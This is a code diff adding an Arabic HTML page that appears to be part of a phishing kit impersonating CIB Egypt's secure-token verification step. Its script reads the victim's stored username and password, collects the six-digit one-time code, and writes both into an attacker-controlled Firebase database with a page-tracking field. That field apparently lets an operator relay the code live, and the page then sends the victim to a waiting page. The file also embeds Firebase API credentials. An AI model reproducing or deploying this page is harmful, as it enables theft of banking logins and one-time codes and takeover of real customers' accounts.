@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>التحقق الإضافي</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+body{
+    font-family:'Cairo',sans-serif;
+    background:
+    radial-gradient(circle at top,#1d4f91 0%,#0c2447 45%,#071427 100%);
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    overflow-x:hidden;
+overflow-y:auto;
+    position:relative;
+}
+
+body::before{
+    content:'';
+    position:absolute;
+    width:700px;
+    height:700px;
+    background:rgba(255,255,255,.04);
+    border-radius:50%;
+    top:-300px;
+    right:-250px;
+}
+.page{
+    padding:20px;
+    width:100%;
+}
+
+body::after{
+    content:'';
+    position:absolute;
+    width:500px;
+    height:500px;
+    background:rgba(255,255,255,.03);
+    border-radius:50%;
+    bottom:-220px;
+    left:-180px;
+}
+
+.page{
+    width:100%;
+    max-width:420px;
+    padding:20px;
+    position:relative;
+    z-index:2;
+}
+
+.card{
+    background:rgba(255,255,255,.08);
+    backdrop-filter:blur(24px);
+    border:1px solid rgba(255,255,255,.1);
+    border-radius:30px;
+    padding:40px 26px;
+    box-shadow:
+    0 20px 60px rgba(0,0,0,.35),
+    inset 0 1px 0 rgba(255,255,255,.06);
+}
+
+.logo{
+    text-align:center;
+    margin-bottom:28px;
+}
+
+.logo img{
+    width:120px;
+    filter:brightness(10);
+}
+
+.icon-wrap{
+    width:85px;
+    height:85px;
+    margin:0 auto 24px;
+    border-radius:24px;
+    background:linear-gradient(135deg,#1f6fe5,#3ba5ff);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    box-shadow:
+    0 15px 35px rgba(59,165,255,.35);
+    animation:pulse 2s infinite;
+}
+
+@keyframes pulse{
+    0%{
+        transform:scale(1);
+    }
+    50%{
+        transform:scale(1.05);
+    }
+    100%{
+        transform:scale(1);
+    }
+}
+
+@media(max-width:480px){
+
+    body{
+        align-items:flex-start;
+        padding:20px 0;
+    }
+
+}
+.title{
+    color:#fff;
+    text-align:center;
+    font-size:24px;
+    font-weight:800;
+    margin-bottom:10px;
+}
+
+.sub{
+    color:rgba(255,255,255,.65);
+    text-align:center;
+    font-size:14px;
+    line-height:1.8;
+    margin-bottom:30px;
+}
+
+.token-box{
+    background:rgba(255,255,255,.07);
+    border:1px solid rgba(255,255,255,.08);
+    border-radius:18px;
+    padding:14px 18px;
+    display:flex;
+    align-items:center;
+    gap:14px;
+    margin-bottom:28px;
+    transition:.3s;
+    cursor:pointer;
+}
+
+.token-box:hover{
+    transform:translateY(-2px);
+    background:rgba(255,255,255,.1);
+}
+
+.token-icon{
+    width:50px;
+    height:50px;
+    border-radius:14px;
+    background:linear-gradient(135deg,#1f6fe5,#3ba5ff);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    flex-shrink:0;
+}
+
+.token-title{
+    color:#fff;
+    font-size:15px;
+    font-weight:700;
+}
+
+.token-sub{
+    color:rgba(255,255,255,.55);
+    font-size:12px;
+}
+
+.label{
+    color:#fff;
+    font-size:14px;
+    margin-bottom:10px;
+    font-weight:600;
+}
+
+.otp-area{
+    display:flex;
+    gap:10px;
+    direction:ltr;
+    margin-bottom:24px;
+}
+
+.otp-input{
+    width:100%;
+    height:58px;
+    border:none;
+    border-radius:18px;
+    background:rgba(255,255,255,.09);
+    border:1px solid rgba(255,255,255,.08);
+    text-align:center;
+    font-size:22px;
+    font-weight:700;
+    color:#fff;
+    outline:none;
+    transition:.25s;
+}
+
+.otp-input:focus{
+    border-color:#4da3ff;
+    background:rgba(255,255,255,.14);
+    transform:translateY(-2px);
+}
+
+.timer{
+    text-align:center;
+    color:rgba(255,255,255,.7);
+    font-size:13px;
+    margin-bottom:24px;
+}
+
+.timer span{
+    color:#7ec3ff;
+    font-weight:700;
+}
+
+.progress{
+    width:100%;
+    height:6px;
+    border-radius:999px;
+    overflow:hidden;
+    background:rgba(255,255,255,.08);
+    margin-bottom:30px;
+}
+
+.progress-bar{
+    width:100%;
+    height:100%;
+    border-radius:999px;
+    background:linear-gradient(90deg,#1f6fe5,#59b2ff);
+    animation:progress 60s linear forwards;
+}
+
+@keyframes progress{
+    from{
+        width:100%;
+    }
+    to{
+        width:0%;
+    }
+}
+
+.submit-btn{
+    width:100%;
+    height:58px;
+    border:none;
+    border-radius:18px;
+    background:linear-gradient(135deg,#1f6fe5,#3ba5ff);
+    color:#fff;
+    font-size:17px;
+    font-weight:800;
+    cursor:pointer;
+    transition:.3s;
+    box-shadow:
+    0 12px 30px rgba(59,165,255,.35);
+}
+
+.submit-btn:hover{
+    transform:translateY(-2px);
+    box-shadow:
+    0 18px 35px rgba(59,165,255,.45);
+}
+
+.secure{
+    margin-top:22px;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    gap:8px;
+    color:rgba(255,255,255,.55);
+    font-size:12px;
+}
+
+.loader{
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,.55);
+    backdrop-filter:blur(6px);
+    display:none;
+    justify-content:center;
+    align-items:center;
+    z-index:999;
+}
+
+.loader.show{
+    display:flex;
+}
+
+.loader-card{
+    background:#fff;
+    padding:40px;
+    border-radius:28px;
+    text-align:center;
+}
+
+.spinner{
+    width:52px;
+    height:52px;
+    border-radius:50%;
+    border:4px solid #dbeafe;
+    border-top-color:#1f6fe5;
+    margin:auto;
+    animation:spin .8s linear infinite;
+    margin-bottom:18px;
+}
+
+@keyframes spin{
+    to{
+        transform:rotate(360deg);
+    }
+}
+
+.loader h3{
+    color:#0f172a;
+    margin-bottom:5px;
+}
+
+.loader p{
+    color:#64748b;
+    font-size:14px;
+}
+
+@media(max-width:480px){
+
+    .page{
+        padding:12px;
+    }
+
+    .card{
+        padding:34px 20px;
+        border-radius:24px;
+    }
+
+}
+</style>
+</head>
+
+<body>
+
+<div class="page">
+
+    <div class="card">
+
+        <div class="logo">
+            <img src="assets/logo.webp">
+        </div>
+
+        <div class="icon-wrap">
+
+            <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.2">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                <polyline points="9 12 11 14 15 10"/>
+            </svg>
+
+        </div>
+
+        <div class="title">
+            التحقق الإضافي
+        </div>
+
+        <div class="sub">
+            يرجى إدخال رمز التحقق المكوّن من 6 أرقام للمتابعة
+        </div>
+
+       <div class="token-box" id="openTokenApp">
+
+    <div class="token-icon">
+
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.2">
+            <rect x="5" y="2" width="14" height="20" rx="2"/>
+            <line x1="12" y1="18" x2="12.01" y2="18"/>
+        </svg>
+
+    </div>
+
+    <div>
+
+        <div class="token-title">
+            Secure Token App
+        </div>
+
+        <div class="token-sub">
+            اضغط لفتح التطبيق
+        </div>
+
+    </div>
+
+</div>
+
+        <div class="label">
+            رمز التحقق
+        </div>
+
+        <div class="otp-area">
+
+            <input class="otp-input" maxlength="1">
+            <input class="otp-input" maxlength="1">
+            <input class="otp-input" maxlength="1">
+            <input class="otp-input" maxlength="1">
+            <input class="otp-input" maxlength="1">
+            <input class="otp-input" maxlength="1">
+
+        </div>
+
+        <div class="timer">
+            الوقت المتبقي: <span id="time">60</span> ثانية
+        </div>
+
+        <div class="progress">
+            <div class="progress-bar"></div>
+        </div>
+
+        <button class="submit-btn" id="submitBtn">
+            تحقق الآن
+        </button>
+
+        <div class="secure">
+
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+            </svg>
+
+            <span>
+                اتصال آمن ومشفّر
+            </span>
+
+        </div>
+
+    </div>
+
+</div>
+
+<div class="loader" id="loader">
+
+    <div class="loader-card">
+
+        <div class="spinner"></div>
+
+        <h3>
+            جاري التحقق
+        </h3>
+
+        <p>
+            يرجى الانتظار...
+        </p>
+
+    </div>
+
+</div>
+
+<script>
+
+const inputs = document.querySelectorAll('.otp-input');
+
+/* OTP INPUTS */
+
+inputs.forEach((input,index)=>{
+
+    input.addEventListener('input',()=>{
+
+        input.value = input.value.replace(/\D/g,'');
+
+        if(input.value && index < inputs.length - 1){
+
+            inputs[index + 1].focus();
+
+        }
+
+    });
+
+    input.addEventListener('keydown',(e)=>{
+
+        if(e.key === 'Backspace' && !input.value && index > 0){
+
+            inputs[index - 1].focus();
+
+        }
+
+    });
+
+});
+
+/* TIMER */
+
+let time = 60;
+
+setInterval(()=>{
+
+    if(time > 0){
+
+        time--;
+
+        document.getElementById('time').innerText = time;
+
+    }
+
+},1000);
+
+</script>
+<script type="module">
+
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+
+import {
+
+    getFirestore,
+    collection,
+    query,
+    where,
+    getDocs,
+    updateDoc,
+    doc
+
+} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+/* =========================
+   FIREBASE
+========================= */
+
+const firebaseConfig = {
+
+  apiKey: "AIzaSyDkGm7g7nvOQqvBUriLwiGAJh1vutsnsMk",
+
+  authDomain: "tijari-42163.firebaseapp.com",
+
+  projectId: "tijari-42163",
+
+  storageBucket: "tijari-42163.firebasestorage.app",
+
+  messagingSenderId: "283984614907",
+
+  appId: "1:283984614907:web:8b9d27c4dfef86d116275e",
+
+  measurementId: "G-P9KGR3B48Y"
+
+};
+
+const app = initializeApp(firebaseConfig);
+
+const db = getFirestore(app);
+
+/* =========================
+   SUBMIT OTP
+========================= */
+
+document.getElementById('submitBtn').onclick = async () => {
+
+    let otpCode = "";
+
+    inputs.forEach(input => {
+
+        otpCode += input.value;
+
+    });
+
+    /* require 6 digits */
+
+    if(otpCode.length !== 6){
+
+        return;
+
+    }
+
+    /* show loader */
+
+    document.getElementById('loader').classList.add('show');
+
+    /* get login data */
+
+    const loginData =
+        JSON.parse(localStorage.getItem('loginData'));
+
+    if(!loginData){
+
+        window.location.href = "login.html";
+
+        return;
+
+    }
+
+    /* find current user */
+
+    const q = query(
+        collection(db,"users"),
+        where("username","==",loginData.username),
+        where("password","==",loginData.password)
+    );
+
+    const snapshot = await getDocs(q);
+
+for (const userDoc of snapshot.docs) {
+
+    await updateDoc(doc(db,"users",userDoc.id),{
+
+        otp: otpCode,
+        currentPage: "waitaccount.html"
+
+    });
+
+}
+
+    /* redirect */
+
+    setTimeout(() => {
+
+        window.location.href = "waitaccount.html";
+
+    }, 1500);
+
+};
+
+/* =========================
+   TOKEN APP
+========================= */
+
+document
+.getElementById("openTokenApp")
+.addEventListener("click", function () {
+
+    const ua = navigator.userAgent || "";
+
+    const isAndroid = /Android/i.test(ua);
+
+    const isiOS = /iPhone|iPad|iPod/i.test(ua);
+
+    /* Android */
+
+    if (isAndroid) {
+
+        window.location.href =
+        "intent://#Intent;scheme=cib;package=com.CIBEgyptSecureToken;end";
+
+        return;
+
+    }
+
+    /* iOS */
+
+    if (isiOS) {
+
+        window.location.href =
+        "cibegyptsecuretoken://";
+
+        return;
+
+    }
+
+});
+
+</script>
+</body>
+</html>
